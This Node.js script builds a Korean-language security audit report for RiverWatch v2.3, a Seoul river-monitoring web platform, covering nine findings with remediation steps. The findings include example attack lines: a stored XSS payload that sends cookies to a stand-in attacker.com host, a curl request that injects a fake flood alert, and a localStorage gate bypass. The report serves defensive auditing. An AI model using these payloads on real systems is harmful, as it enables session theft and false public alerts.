const { Document, Packer, Paragraph, TextRun, Table, TableRow, TableCell,
  Header, Footer, AlignmentType, HeadingLevel, BorderStyle, WidthType, ShadingType,
  LevelFormat, PageBreak, PageNumber } = require('docx');
const fs = require('fs');

const border = { style: BorderStyle.SINGLE, size: 1, color: "CCCCCC" };
const borders = { top: border, bottom: border, left: border, right: border };
const cellMargins = { top: 80, bottom: 80, left: 120, right: 120 };

function cell(text, opts = {}) {
  const { bold, width, shading, align } = opts;
  return new TableCell({
    borders,
    width: width ? { size: width, type: WidthType.DXA } : undefined,
    shading: shading ? { fill: shading, type: ShadingType.CLEAR } : undefined,
    margins: cellMargins,
    verticalAlign: 'center',
    children: [new Paragraph({
      alignment: align || AlignmentType.LEFT,
      children: [new TextRun({ text: text || '', bold: !!bold, font: 'Arial', size: 20 })]
    })]
  });
}

function headerCell(text, width) {
  return cell(text, { bold: true, width, shading: 'D5E8F0' });
}

const findings = [
  {
    id: 'SEC-001',
    severity: '심각 (Critical)',
    sevColor: 'FFE0E0',
    title: '.env에 service_role 키 저장',
    desc: '.env 파일에 Supabase service_role JWT가 저장되어 있습니다. 이 키는 모든 RLS 정책을 우회하며 전체 DB에 대한 읽기/쓰기/삭제가 가능합니다. .gitignore에 포함되어 Git에는 추적되지 않으나, 로컬 파일 유출 시 전체 DB가 노출됩니다.',
    risk: '파일 유출 시 모든 테이블 데이터 읽기/수정/삭제 가능. RLS 무력화. 시민 수질 측정 데이터(개인정보 포함) 노출 위험.',
    fix: '1) Supabase 대시보드에서 service_role 키 즉시 재생성\n2) Git 히스토리에서 .env 흔적 확인 (git log -p -- .env)\n3) collectors는 GitHub Actions secrets만 사용하도록 전환\n4) 로컬 .env 사용 최소화, 필요시 anon key만 보관'
  },
  {
    id: 'SEC-002',
    severity: '높음 (High)',
    sevColor: 'FFF0D0',
    title: 'Supabase anon key + 개방 INSERT 정책 조합',
    desc: 'dashboard.html, report.html, mission.html 등에 anon key가 노출되어 있습니다. anon key 자체는 설계상 공개 가능하나, species_observations, citizen_water_quality, water_quality 테이블의 INSERT 정책이 WITH CHECK(true)로 완전 개방되어 있어 누구나 curl로 데이터를 삽입할 수 있습니다.',
    risk: '스팸 데이터 대량 삽입, 가짜 홍수경보 생성, XSS 페이로드 저장, 저장소 용량 고갈. 공격 예시: curl -X POST supabase.co/rest/v1/flood_alerts -d \'{"alert_level":"CRITICAL","river":"도림천"}\'',
    fix: '1) INSERT 정책에 필드 검증 추가 (NOT NULL, char_length 제한, 범위 검증)\n2) Supabase Edge Function으로 rate limiting 구현\n3) water_level 범위 제한 (0~500), pH 범위 제한 (0~14)\n4) source 필드 강제 설정'
  },
  {
    id: 'SEC-003',
    severity: '높음 (High)',
    sevColor: 'FFF0D0',
    title: 'gate.js 클라이언트 측 인증 우회',
    desc: 'gate.js는 SHA-256 해시 비교로 접근을 제어하나, 개발자 도구에서 localStorage.setItem(\'rw_gate_token\', \'해시값\')으로 즉시 우회 가능합니다. HTML 소스는 gate 오버레이 표시 전에 이미 로드됩니다. adminArea도 localStorage 확인만으로 토글됩니다.',
    risk: '비인가 사용자가 모든 페이지에 접근 가능. 관리 링크(위키, GitHub, 프로필) 노출. 단, Supabase 데이터는 이미 공개 SELECT이므로 데이터 유출 추가 위험은 제한적.',
    fix: '1) Beta 단계에서는 허용 가능한 수준\n2) 공개 전환 시 Supabase Auth 또는 Cloudflare Access 도입\n3) adminArea는 서버 측 인증으로 전환 필요\n4) 민감 페이지는 Cloudflare Workers로 사전 차단'
  },
  {
    id: 'SEC-004',
    severity: '높음 (High)',
    sevColor: 'FFF0D0',
    title: 'Stored XSS via innerHTML',
    desc: 'analysis.html에서 DB 데이터를 innerHTML로 직접 삽입합니다 (line 346-349: river 이름, line 387: station 이름, line 444: alert_level). dashboard.html의 esc() 함수는 적용되어 있으나, analysis.html, river-on.html, play.html에는 esc() 함수가 없습니다.',
    risk: '공격자가 species_observations에 악성 taxon_name을 INSERT하면 XSS 실행 가능. 예: <img src=x onerror="fetch(\'attacker.com?c=\'+document.cookie)"> 삽입 → 다른 사용자가 analysis.html 조회 시 실행.',
    fix: '1) 모든 HTML에 esc() 함수 통일 적용\n2) analysis.html의 모든 innerHTML에 esc() 래핑\n3) innerHTML 대신 textContent 사용 권장\n4) CSP 헤더로 inline script 차단'
  },
  {
    id: 'SEC-005',
    severity: '중간 (Medium)',
    sevColor: 'FFFDE0',
    title: '클라이언트 측 입력 검증 미흡',
    desc: 'report.html (line 331-341): species 빈값만 확인, observer/memo/GPS 미검증. dashboard.html의 submitCitizen(): 수질 측정값 범위 미검증. URL 파라미터(species, river)가 직접 input.value에 삽입됩니다.',
    risk: 'GPS 좌표 범위 초과 (-9999, 99999), pH 비정상값 삽입, 악성 문자열 저장. 현재 input.value 할당이므로 직접적 XSS는 아니나, 저장 후 innerHTML 표시 시 위험.',
    fix: '1) GPS: 서울 범위 검증 (lat 37.4~37.7, lng 126.8~127.1)\n2) pH: 0~14, DO: 0~20, 수온: -5~45 범위 검증\n3) 문자열 길이 제한 (species: 200자, memo: 1000자)\n4) RLS 트리거로 서버 측 검증 추가'
  },
  {
    id: 'SEC-006',
    severity: '낮음 (Low)',
    sevColor: 'E8F5E9',
    title: 'CSP 헤더 미설정',
    desc: 'Cloudflare Pages에 Content-Security-Policy, X-Frame-Options, Referrer-Policy 등 보안 헤더가 설정되어 있지 않습니다. CDN 스크립트(Chart.js, Leaflet, Tabler Icons)에 Subresource Integrity(SRI)가 적용되지 않았습니다.',
    risk: 'CDN 오염 시 악성 스크립트 실행 가능. 클릭재킹 공격에 취약.',
    fix: '1) _headers 파일 생성하여 CSP 설정\n2) CDN 스크립트에 integrity 속성 추가\n3) X-Frame-Options: DENY 설정\n4) Referrer-Policy: strict-origin-when-cross-origin'
  },
  {
    id: 'SEC-007',
    severity: '낮음 (Low)',
    sevColor: 'E8F5E9',
    title: '서비스 워커 캐시 무효화 문제',
    desc: 'sw.js의 CACHE_NAME이 \'riverwatch-v1\'으로 고정되어 배포 시 자동 갱신되지 않습니다. 보안 패치 배포 후에도 구 버전 캐시가 제공될 수 있습니다.',
    risk: '보안 업데이트 지연. 사용자가 취약한 구 버전을 계속 사용.',
    fix: '1) 배포 시 CACHE_NAME에 빌드 해시/날짜 자동 삽입\n2) stale-while-revalidate 전략으로 전환\n3) skipWaiting() + clients.claim() 즉시 활성화'
  },
  {
    id: 'SEC-008',
    severity: '정보 (Info)',
    sevColor: 'E3F2FD',
    title: '.env Git 추적 제외 확인',
    desc: '.gitignore에 .env, __pycache__/, *.pyc, node_modules/ 등이 포함되어 있습니다. GitHub Actions에서는 ${{ secrets.* }}로 안전하게 처리됩니다.',
    risk: '현재 위험 없음. 올바르게 구성됨.',
    fix: '현재 상태 유지. 주기적으로 git log -p -- .env 실행하여 히스토리 확인.'
  },
  {
    id: 'SEC-009',
    severity: '정보 (Info)',
    sevColor: 'E3F2FD',
    title: '개인정보 수집 최소화 확인',
    desc: 'report.html: 닉네임(선택), GPS 좌표, 종 이름, 하천, 메모만 수집. 여권번호, 비자번호, 외국인등록번호 등 민감 정보는 수집하지 않습니다.',
    risk: '현재 위험 없음. 개인정보 최소수집 정책 준수.',
    fix: '현재 상태 유지. Geosigi 앱 개발 시에도 여권번호/비자번호/외국인등록번호 절대 수집 금지 정책 유지.'
  }
];

const doc = new Document({
  styles: {
    default: { document: { run: { font: "Arial", size: 22 } } },
    paragraphStyles: [
      { id: "Heading1", name: "Heading 1", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 36, bold: true, font: "Arial", color: "1a1a2e" },
        paragraph: { spacing: { before: 360, after: 200 }, outlineLevel: 0 } },
      { id: "Heading2", name: "Heading 2", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 28, bold: true, font: "Arial", color: "333333" },
        paragraph: { spacing: { before: 240, after: 120 }, outlineLevel: 1 } },
      { id: "Heading3", name: "Heading 3", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 24, bold: true, font: "Arial", color: "555555" },
        paragraph: { spacing: { before: 180, after: 80 }, outlineLevel: 2 } },
    ]
  },
  numbering: {
    config: [{
      reference: "bullets",
      levels: [{ level: 0, format: LevelFormat.BULLET, text: "•", alignment: AlignmentType.LEFT,
        style: { paragraph: { indent: { left: 720, hanging: 360 } } } }]
    }]
  },
  sections: [{
    properties: {
      page: {
        size: { width: 11906, height: 16838 },
        margin: { top: 1440, right: 1200, bottom: 1440, left: 1200 }
      }
    },
    headers: {
      default: new Header({
        children: [new Paragraph({
          alignment: AlignmentType.RIGHT,
          children: [new TextRun({ text: "RiverWatch v2.3 보안점검 보고서", font: "Arial", size: 16, color: "999999" })]
        })]
      })
    },
    footers: {
      default: new Footer({
        children: [new Paragraph({
          alignment: AlignmentType.CENTER,
          children: [
            new TextRun({ text: "비공개 문서 | ", font: "Arial", size: 16, color: "999999" }),
            new TextRun({ text: "Page ", font: "Arial", size: 16, color: "999999" }),
            new TextRun({ children: [PageNumber.CURRENT], font: "Arial", size: 16, color: "999999" })
          ]
        })]
      })
    },
    children: [
      // Title page
      new Paragraph({ spacing: { before: 2400 }, alignment: AlignmentType.CENTER, children: [] }),
      new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 200 },
        children: [new TextRun({ text: "RiverWatch v2.3", font: "Arial", size: 56, bold: true, color: "7873f5" })] }),
      new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 600 },
        children: [new TextRun({ text: "보안점검 보고서", font: "Arial", size: 40, color: "333333" })] }),
      new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 100 },
        children: [new TextRun({ text: "서울하천 AI 모니터링 플랫폼", font: "Arial", size: 22, color: "888888" })] }),
      new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 100 },
        children: [new TextRun({ text: "작성일: 2026-07-06", font: "Arial", size: 22, color: "888888" })] }),
      new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 100 },
        children: [new TextRun({ text: "버전: 2.3 (commit 136942f)", font: "Arial", size: 22, color: "888888" })] }),
      new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 100 },
        children: [new TextRun({ text: "도깨비3.0 · AI활동가 1기", font: "Arial", size: 22, color: "888888" })] }),

      new Paragraph({ children: [new PageBreak()] }),

      // 1. Executive Summary
      new Paragraph({ heading: HeadingLevel.HEADING_1, children: [new TextRun("1. 요약 (Executive Summary)")] }),
      new Paragraph({ spacing: { after: 120 }, children: [
        new TextRun({ text: "RiverWatch v2.3에 대한 종합 보안점검을 수행했습니다.", size: 21 })
      ] }),
      new Paragraph({ spacing: { after: 120 }, children: [
        new TextRun({ text: "검토 범위: ", bold: true, size: 21 }),
        new TextRun({ text: "9개 HTML 페이지, 6개 Python 수집기, 8개 SQL 스크립트, 1개 서비스워커, 1개 게이트 스크립트, .env 환경변수, GitHub Actions CI/CD, Cloudflare Pages 배포 구성", size: 21 })
      ] }),
      new Paragraph({ spacing: { after: 200 }, children: [
        new TextRun({ text: "대상 하천: ", bold: true, size: 21 }),
        new TextRun({ text: "서울특별시 22개 하천 (도림천, 양재천, 중랑천, 안양천, 탄천, 홍제천, 불광천, 정릉천, 성북천, 우이천, 묵동천, 방학천, 전농천, 면목천, 월계천, 여의천, 반포천, 사당천, 대림천, 신월천, 구로천, 한강(서울))", size: 21 })
      ] }),

      // Summary table
      new Table({
        width: { size: 9026, type: WidthType.DXA },
        columnWidths: [2400, 1200, 5426],
        rows: [
          new TableRow({ children: [
            headerCell("심각도", 2400), headerCell("건수", 1200), headerCell("요약", 5426)
          ]}),
          new TableRow({ children: [
            cell("심각 (Critical)", { width: 2400, shading: "FFE0E0" }),
            cell("1", { width: 1200, align: AlignmentType.CENTER }),
            cell(".env에 service_role 키 저장", { width: 5426 })
          ]}),
          new TableRow({ children: [
            cell("높음 (High)", { width: 2400, shading: "FFF0D0" }),
            cell("3", { width: 1200, align: AlignmentType.CENTER }),
            cell("anon key+개방 INSERT, gate 우회, Stored XSS", { width: 5426 })
          ]}),
          new TableRow({ children: [
            cell("중간 (Medium)", { width: 2400, shading: "FFFDE0" }),
            cell("1", { width: 1200, align: AlignmentType.CENTER }),
            cell("입력 검증 미흡", { width: 5426 })
          ]}),
          new TableRow({ children: [
            cell("낮음 (Low)", { width: 2400, shading: "E8F5E9" }),
            cell("2", { width: 1200, align: AlignmentType.CENTER }),
            cell("CSP 헤더 미설정, SW 캐시 무효화", { width: 5426 })
          ]}),
          new TableRow({ children: [
            cell("정보 (Info)", { width: 2400, shading: "E3F2FD" }),
            cell("2", { width: 1200, align: AlignmentType.CENTER }),
            cell(".env 제외 확인, 개인정보 최소화 확인", { width: 5426 })
          ]}),
        ]
      }),

      new Paragraph({ spacing: { before: 200, after: 200 }, children: [
        new TextRun({ text: "전체 판정: ", bold: true, size: 22, color: "CC0000" }),
        new TextRun({ text: "Beta 운영 기준 조건부 허용. SEC-001(service_role 키) 즉시 조치 필요. 공개 전환 시 SEC-002~004 해결 필수.", size: 22 })
      ] }),

      new Paragraph({ children: [new PageBreak()] }),

      // 2. System Architecture
      new Paragraph({ heading: HeadingLevel.HEADING_1, children: [new TextRun("2. 시스템 구성")] }),

      new Table({
        width: { size: 9506, type: WidthType.DXA },
        columnWidths: [2800, 6706],
        rows: [
          new TableRow({ children: [headerCell("구성요소", 2800), headerCell("세부사항", 6706)] }),
          new TableRow({ children: [cell("프론트엔드", { width: 2800, bold: true }), cell("HTML/JS/CSS 정적 사이트 (9개 페이지)", { width: 6706 })] }),
          new TableRow({ children: [cell("호스팅", { width: 2800, bold: true }), cell("Cloudflare Pages (dorimchun-ai.pages.dev)", { width: 6706 })] }),
          new TableRow({ children: [cell("백엔드", { width: 2800, bold: true }), cell("Supabase (PostgreSQL + PostgREST API)", { width: 6706 })] }),
          new TableRow({ children: [cell("데이터 수집", { width: 2800, bold: true }), cell("Python collectors (GitHub Actions cron)", { width: 6706 })] }),
          new TableRow({ children: [cell("인증", { width: 2800, bold: true }), cell("gate.js (SHA-256 해시 기반 클라이언트 측)", { width: 6706 })] }),
          new TableRow({ children: [cell("CI/CD", { width: 2800, bold: true }), cell("GitHub Actions → Cloudflare Pages 자동 배포", { width: 6706 })] }),
          new TableRow({ children: [cell("RLS", { width: 2800, bold: true }), cell("모든 테이블 RLS 활성화, SELECT 공개, INSERT 제한적 허용", { width: 6706 })] }),
        ]
      }),

      new Paragraph({ children: [new PageBreak()] }),

      // 3. Detailed Findings
      new Paragraph({ heading: HeadingLevel.HEADING_1, children: [new TextRun("3. 상세 보안점검 결과")] }),

      ...findings.flatMap(f => [
        new Paragraph({ heading: HeadingLevel.HEADING_2, children: [new TextRun(`${f.id}: ${f.title}`)] }),
        new Table({
          width: { size: 9026, type: WidthType.DXA },
          columnWidths: [2200, 6826],
          rows: [
            new TableRow({ children: [cell("심각도", { width: 2200, bold: true, shading: "F5F5F5" }), cell(f.severity, { width: 6826, shading: f.sevColor })] }),
            new TableRow({ children: [cell("설명", { width: 2200, bold: true, shading: "F5F5F5" }), cell(f.desc, { width: 6826 })] }),
            new TableRow({ children: [cell("위험", { width: 2200, bold: true, shading: "F5F5F5" }), cell(f.risk, { width: 6826 })] }),
            new TableRow({ children: [cell("권고조치", { width: 2200, bold: true, shading: "F5F5F5" }), cell(f.fix, { width: 6826 })] }),
          ]
        }),
        new Paragraph({ spacing: { after: 200 }, children: [] }),
      ]),

      new Paragraph({ children: [new PageBreak()] }),

      // 4. RLS Policy Summary
      new Paragraph({ heading: HeadingLevel.HEADING_1, children: [new TextRun("4. RLS 정책 현황")] }),

      new Table({
        width: { size: 9506, type: WidthType.DXA },
        columnWidths: [3200, 1800, 1800, 2706],
        rows: [
          new TableRow({ children: [headerCell("테이블", 3200), headerCell("SELECT", 1800), headerCell("INSERT", 1800), headerCell("비고", 2706)] }),
          new TableRow({ children: [cell("river_readings", { width: 3200 }), cell("✅ 공개", { width: 1800 }), cell("❌ 차단", { width: 1800 }), cell("collectors만 INSERT", { width: 2706 })] }),
          new TableRow({ children: [cell("species_observations", { width: 3200 }), cell("✅ 공개", { width: 1800 }), cell("⚠️ 개방", { width: 1800 }), cell("시민제보용 (SEC-004)", { width: 2706 })] }),
          new TableRow({ children: [cell("citizen_water_quality", { width: 3200 }), cell("✅ 공개", { width: 1800 }), cell("⚠️ 개방", { width: 1800 }), cell("시민측정용", { width: 2706 })] }),
          new TableRow({ children: [cell("ehi_scores", { width: 3200 }), cell("✅ 공개", { width: 1800 }), cell("❌ 차단", { width: 1800 }), cell("collectors만 INSERT", { width: 2706 })] }),
          new TableRow({ children: [cell("cultural_assets", { width: 3200 }), cell("✅ 공개", { width: 1800 }), cell("❌ 차단", { width: 1800 }), cell("collectors만 INSERT", { width: 2706 })] }),
          new TableRow({ children: [cell("flood_alerts", { width: 3200 }), cell("✅ 공개", { width: 1800 }), cell("❌ 차단", { width: 1800 }), cell("", { width: 2706 })] }),
          new TableRow({ children: [cell("geosigi_*", { width: 3200 }), cell("✅ 공개", { width: 1800 }), cell("✅ 허용", { width: 1800 }), cell("앱 사용자 데이터", { width: 2706 })] }),
        ]
      }),

      new Paragraph({ children: [new PageBreak()] }),

      // 5. Recommendations
      new Paragraph({ heading: HeadingLevel.HEADING_1, children: [new TextRun("5. 권고사항 우선순위")] }),

      new Paragraph({ heading: HeadingLevel.HEADING_2, children: [new TextRun("즉시 조치 (오늘)")] }),
      ...["[SEC-001] Supabase service_role 키 재생성 (Project Settings > API > Reset)",
        "[SEC-001] git log -p -- .env 로 히스토리 확인, 필요시 git-filter-repo로 정리"].map(t =>
        new Paragraph({ numbering: { reference: "bullets", level: 0 }, children: [new TextRun({ text: t, size: 21 })] })
      ),

      new Paragraph({ heading: HeadingLevel.HEADING_2, children: [new TextRun("단기 (1주 이내)")] }),
      ...["[SEC-004] analysis.html 등 모든 HTML에 esc() 함수 통일 적용",
        "[SEC-002] INSERT 정책에 필드 검증 추가 (NOT NULL, char_length, 범위)",
        "[SEC-005] 입력 폼에 GPS/pH/수온 범위 검증 추가",
        "[SEC-007] sw.js CACHE_NAME에 빌드 해시 자동 삽입"].map(t =>
        new Paragraph({ numbering: { reference: "bullets", level: 0 }, children: [new TextRun({ text: t, size: 21 })] })
      ),

      new Paragraph({ heading: HeadingLevel.HEADING_2, children: [new TextRun("중기 (공개 전환 시)")] }),
      ...["[SEC-002] Supabase Edge Function으로 INSERT 프록시 + rate limiting",
        "[SEC-003] Cloudflare Access 또는 Supabase Auth 도입하여 gate.js 대체",
        "[SEC-006] _headers 파일로 CSP/X-Frame-Options 설정",
        "[SEC-006] CDN 스크립트에 SRI integrity 속성 추가"].map(t =>
        new Paragraph({ numbering: { reference: "bullets", level: 0 }, children: [new TextRun({ text: t, size: 21 })] })
      ),

      new Paragraph({ heading: HeadingLevel.HEADING_2, children: [new TextRun("장기")] }),
      ...["서버 측 렌더링(SSR) 전환으로 API key 완전 은닉",
        "감사 로깅 시스템 구축 (누가, 언제, 무엇을 INSERT했는지 추적)",
        "Geosigi 앱 보안 아키텍처 사전 설계 (개인정보 수집 최소화 정책 유지)"].map(t =>
        new Paragraph({ numbering: { reference: "bullets", level: 0 }, children: [new TextRun({ text: t, size: 21 })] })
      ),

      new Paragraph({ spacing: { before: 600 }, children: [] }),
      new Paragraph({ spacing: { after: 200 }, alignment: AlignmentType.CENTER, children: [
        new TextRun({ text: "--- 문서 끝 ---", color: "999999", size: 20 })
      ] }),
    ]
  }]
});

Packer.toBuffer(doc).then(buf => {
  fs.writeFileSync(process.argv[2] || 'RiverWatch_Security_Report.docx', buf);
  console.log('Security report generated');
});
